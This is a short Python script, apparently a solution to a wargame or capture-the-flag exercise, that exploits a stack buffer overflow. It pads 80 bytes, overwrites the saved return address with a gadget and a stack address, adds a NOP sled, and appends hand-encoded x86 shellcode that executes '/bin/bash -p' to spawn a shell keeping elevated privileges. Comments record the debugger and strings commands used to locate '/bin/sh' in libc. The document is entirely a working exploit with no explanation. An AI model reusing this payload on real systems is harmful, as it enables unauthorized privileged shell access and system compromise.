# info proc map
# strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"

import struct

padding = "a" * 80
eip = struct.pack("I", 0x080484f9)
eip += struct.pack("I", 0xbffffc60 + 50)
nop = "\x90" * 100
interrupt = "\xcc"
payload = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70" \
          "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61" \
          "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52" \
          "\x51\x53\x89\xe1\xcd\x80"
print(padding + eip + nop + payload)
